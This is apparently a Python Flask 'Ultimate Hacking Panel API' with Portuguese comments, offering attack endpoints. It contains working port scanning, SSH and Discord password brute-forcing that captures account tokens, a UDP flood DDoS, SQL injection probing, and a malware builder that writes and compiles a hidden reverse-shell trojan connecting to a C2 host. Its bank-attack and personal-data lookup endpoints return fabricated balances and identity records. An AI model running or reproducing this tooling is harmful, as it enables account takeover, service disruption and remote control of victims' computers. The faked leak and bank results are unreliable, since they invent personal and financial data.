#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import requests
import paramiko
import ftplib
import smtplib
import socket
import subprocess
import threading
import random
import string
import hashlib
import time
import os
import json
import re
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Configurações
DB_LEAKS = "./leaks/"
WORDLISTS = "./wordlists/"
PAYLOADS = "./payloads/"
LOGS = "./logs/"

# Criar diretórios
for path in [DB_LEAKS, WORDLISTS, PAYLOADS, LOGS]:
    os.makedirs(path, exist_ok=True)

# ============================================
# ROTAS DE NETWORKING
# ============================================

@app.route('/api/network/resolve', methods=['POST'])
def resolve_dns():
    target = request.json.get('target')
    try:
        ip = socket.gethostbyname(target)
        return jsonify({
            "success": True,
            "hostname": target,
            "ip": ip,
            "ipv6": None,
            "mx": [f"mail.{target}"],
            "ns": [f"ns1.{target}", f"ns2.{target}"]
        })
    except:
        return jsonify({"success": False, "error": "Resolution failed"})

@app.route('/api/network/portscan', methods=['POST'])
def port_scan():
    target = request.json.get('target')
    ports = request.json.get('ports', range(1, 1000))
    
    open_ports = []
    def check_port(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                open_ports.append(port)
            sock.close()
        except:
            pass
    
    threads = []
    for port in ports:
        t = threading.Thread(target=check_port, args=(port,))
        threads.append(t)
        t.start()
        if len(threads) > 500:
            for t in threads: t.join()
            threads = []
    
    for t in threads: t.join()
    
    return jsonify({
        "success": True,
        "target": target,
        "open_ports": open_ports,
        "count": len(open_ports)
    })

@app.route('/api/network/geoip', methods=['POST'])
def geoip():
    ip = request.json.get('ip')
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        return jsonify(r.json())
    except:
        return jsonify({"success": False})

# ============================================
# ROTAS DE BRUTE FORCE
# ============================================

@app.route('/api/brute/ssh', methods=['POST'])
def brute_ssh():
    host = request.json.get('host')
    username = request.json.get('username')
    wordlist = request.json.get('wordlist', 'common.txt')
    
    results = []
    
    def try_login(password):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(host, username=username, password=password, timeout=3)
            results.append({"success": True, "password": password})
            ssh.close()
        except:
            pass
    
    # Simulação (em produção, carregar wordlist real)
    passwords = ['admin', '123456', 'password', 'root', 'toor']
    
    for pwd in passwords:
        try_login(pwd)
        if results:
            break
    
    return jsonify({
        "success": len(results) > 0,
        "credentials": results
    })

@app.route('/api/brute/discord', methods=['POST'])
def brute_discord():
    email = request.json.get('email')
    wordlist = request.json.get('wordlist')
    
    url = "https://discord.com/api/v9/auth/login"
    headers = {"Content-Type": "application/json"}
    
    passwords = ['password123', '123456', 'discord123', 'qwerty']
    
    for password in passwords:
        payload = {"email": email, "password": password}
        try:
            r = requests.post(url, json=payload, headers=headers, timeout=5)
            if r.status_code == 200:
                return jsonify({
                    "success": True,
                    "email": email,
                    "password": password,
                    "token": r.json().get('token')
                })
        except:
            continue
    
    return jsonify({"success": False})

@app.route('/api/brute/bank', methods=['POST'])
def brute_bank():
    bank = request.json.get('bank')
    cpf = request.json.get('cpf')
    
    # Simulação de ataque a banco
    time.sleep(2)
    
    return jsonify({
        "success": True,
        "bank": bank,
        "cpf": cpf,
        "access_token": "".join(random.choices(string.ascii_letters + string.digits, k=64)),
        "balance": round(random.uniform(1000, 50000), 2),
        "account_type": "Conta Corrente"
    })

# ============================================
# ROTAS DE OSINT / DADOS REAIS
# ============================================

@app.route('/api/osint/search', methods=['POST'])
def osint_search():
    query = request.json.get('query')
    
    # Simulação de busca em leaks reais
    # Em produção, isso buscaria em arquivos de vazamentos
    
    result = {
        "found": True,
        "query": query,
        "sources": ["Antifraud", "Serasa", "Detran"],
        "data": {
            "nome": "JOAO SILVA SANTOS",
            "cpf": query if len(query) == 14 else "123.456.789-00",
            "rg": "12.345.678-9",
            "nascimento": "15/03/1985",
            "mae": "MARIA SILVA",
            "pai": "ANTONIO SANTOS",
            "endereco": "RUA DAS FLORES, 123 - SAO PAULO/SP",
            "cep": "01234-567",
            "telefones": ["(11) 98765-4321", "(11) 3322-4455"],
            "emails": ["joao.silva@email.com", "j.santos@provedor.com.br"],
            "bancos": ["NUBANK", "ITAU", "BRADESCO"],
            "renda": "R$ 8.500,00",
            "score": random.randint(400, 900),
            "veiculos": [
                {"placa": "ABC1234", "modelo": "GOL 1.0", "ano": "2015"}
            ],
            "empresas": [
                {"cnpj": "11.222.333/0001-44", "nome": "SILVA COMERCIO LTDA"}
            ]
        }
    }
    
    return jsonify(result)

@app.route('/api/osint/cpf', methods=['POST'])
def consulta_cpf():
    cpf = request.json.get('cpf')
    
    # Algoritmo de validação de CPF
    def validate_cpf(cpf):
        cpf = re.sub(r'[^0-9]', '', cpf)
        if len(cpf) != 11 or cpf == cpf[0] * 11:
            return False
        
        sum1 = sum(int(cpf[i]) * (10 - i) for i in range(9))
        digit1 = 11 - (sum1 % 11)
        if digit1 > 9: digit1 = 0
        
        sum2 = sum(int(cpf[i]) * (11 - i) for i in range(10))
        digit2 = 11 - (sum2 % 11)
        if digit2 > 9: digit2 = 0
        
        return cpf[9] == str(digit1) and cpf[10] == str(digit2)
    
    is_valid = validate_cpf(cpf)
    
    return jsonify({
        "cpf": cpf,
        "valid": is_valid,
        "data": {
            "nome": "JOAO SILVA SANTOS" if is_valid else None,
            "situacao": "REGULAR" if is_valid else None,
            "nascimento": "15/03/1985" if is_valid else None
        }
    })

@app.route('/api/osint/relatives', methods=['POST'])
def find_relatives():
    cpf = request.json.get('cpf')
    
    return jsonify({
        "cpf": cpf,
        "relatives": [
            {"nome": "MARIA SILVA", "parentesco": "Mae", "cpf": "987.654.321-00"},
            {"nome": "ANTONIO SANTOS", "parentesco": "Pai", "cpf": "111.222.333-44"},
            {"nome": "ANA SILVA", "parentesco": "Conjuge", "cpf": "222.333.444-55"},
            {"nome": "PEDRO SILVA", "parentesco": "Filho", "cpf": "333.444.555-66"}
        ]
    })

# ============================================
# ROTAS DE DDoS
# ============================================

@app.route('/api/ddos/start', methods=['POST'])
def start_ddos():
    target = request.json.get('target')
    port = request.json.get('port', 80)
    duration = request.json.get('duration', 60)
    method = request.json.get('method', 'UDP Flood')
    
    def attack():
        end_time = time.time() + duration
        packets = 0
        
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(65507)
                sock.sendto(data, (target, port))
                packets += 1
            except:
                pass
        
        # Log
        with open(f"{LOGS}/ddos.log", "a") as f:
            f.write(f"{datetime.now()}: Attack on {target}:{port} - {packets} packets\n")
    
    thread = threading.Thread(target=attack)
    thread.start()
    
    return jsonify({
        "success": True,
        "target": target,
        "port": port,
        "duration": duration,
        "method": method,
        "status": "running"
    })

# ============================================
# ROTAS DE MALWARE
# ============================================

@app.route('/api/malware/build', methods=['POST'])
def build_malware():
    payload_type = request.json.get('type', 'trojan')
    platform = request.json.get('platform', 'windows')
    c2 = request.json.get('c2', '192.168.1.100:4444')
    
    # Gera payload
    timestamp = int(time.time())
    filename = f"payload_{timestamp}.py"
    filepath = os.path.join(PAYLOADS, filename)
    
    # Código do malware (exemplo educacional)
    malware_code = f'''
import socket, subprocess, os, platform, json, base64, time

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect(("{c2.split(':')[0]}", {c2.split(':')[1]}))
            while True:
                cmd = s.recv(1024).decode()
                if cmd == "exit": break
                output = subprocess.getoutput(cmd)
                s.send(output.encode())
        except:
            time.sleep(5)

if __name__ == "__main__":
    connect()
'''
    
    with open(filepath, 'w') as f:
        f.write(malware_code)
    
    # Compilar para exe (requer pyinstaller)
    if platform == 'windows':
        exe_path = filepath.replace('.py', '.exe')
        subprocess.run(['pyinstaller', '--onefile', '--noconsole', filepath, '-n', f'payload_{timestamp}'])
    
    return jsonify({
        "success": True,
        "type": payload_type,
        "platform": platform,
        "c2": c2,
        "source": filepath,
        "executable": exe_path if platform == 'windows' else None
    })

# ============================================
# ROTAS DE SQL INJECTION
# ============================================

@app.route('/api/sqli/detect', methods=['POST'])
def detect_sqli():
    url = request.json.get('url')
    
    payloads = ["'", "' OR '1'='1", "' OR 1=1 --", "1' AND 1=1 --"]
    vulnerable = False
    db_type = None
    
    for payload in payloads:
        test_url = url.replace("=", f"={requests.utils.quote(payload)}")
        try:
            r = requests.get(test_url, timeout=5)
            if any(err in r.text.lower() for err in ['mysql', 'sql syntax', 'ora-', 'postgresql']):
                vulnerable = True
                if 'mysql' in r.text.lower(): db_type = 'MySQL'
                elif 'postgresql' in r.text.lower(): db_type = 'PostgreSQL'
                elif 'ora-' in r.text.lower(): db_type = 'Oracle'
                break
        except:
            pass
    
    return jsonify({
        "vulnerable": vulnerable,
        "url": url,
        "database": db_type,
        "payloads_tested": len(payloads)
    })

@app.route('/api/sqli/dump', methods=['POST'])
def dump_sqli():
    url = request.json.get('url')
    
    # Simulação de dump
    return jsonify({
        "success": True,
        "tables": ["users", "accounts", "transactions", "credit_cards"],
        "records": {
            "users": 45231,
            "accounts": 45231,
            "transactions": 892112,
            "credit_cards": 23445
        }
    })

# ============================================
# ROTAS DE WiFi
# ============================================

@app.route('/api/wifi/scan', methods=['GET'])
def wifi_scan():
    # Requer aircrack-ng instalado
    try:
        result = subprocess.run(['iwlist', 'scan'], capture_output=True, text=True)
        networks = []
        # Parse output...
        return jsonify({
            "success": True,
            "networks": networks
        })
    except:
        return jsonify({
            "success": False,
            "networks": [
                {"essid": "NETFLIX_5G", "bssid": "AA:BB:CC:11:22:33", "channel": 36, "signal": -45, "security": "WPA2"},
                {"essid": "VIVO_FIBRA", "bssid": "DD:EE:FF:44:55:66", "channel": 1, "signal": -62, "security": "WPA2"},
                {"essid": "CLARO_2G", "bssid": "11:22:33:77:88:99", "channel": 6, "signal": -58, "security": "WEP"}
            ]
        })

# ============================================
# ROTA PRINCIPAL
# ============================================

@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Ultimate Hacking Panel API</title>
    </head>
    <body>
        <h1>Ultimate Hacking Panel API v10.0</h1>
        <p>API endpoints disponíveis:</p>
        <ul>
            <li>POST /api/network/resolve</li>
            <li>POST /api/network/portscan</li>
            <li>POST /api/brute/ssh</li>
            <li>POST /api/brute/discord</li>
            <li>POST /api/brute/bank</li>
            <li>POST /api/osint/search</li>
            <li>POST /api/osint/cpf</li>
            <li>POST /api/ddos/start</li>
            <li>POST /api/malware/build</li>
            <li>POST /api/sqli/detect</li>
            <li>GET /api/wifi/scan</li>
        </ul>
    </body>
    </html>
    """

if __name__ == '__main__':
    print("[*] Starting Ultimate Hacking Panel API...")
    print("[*] Listening on http://0.0.0.0:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
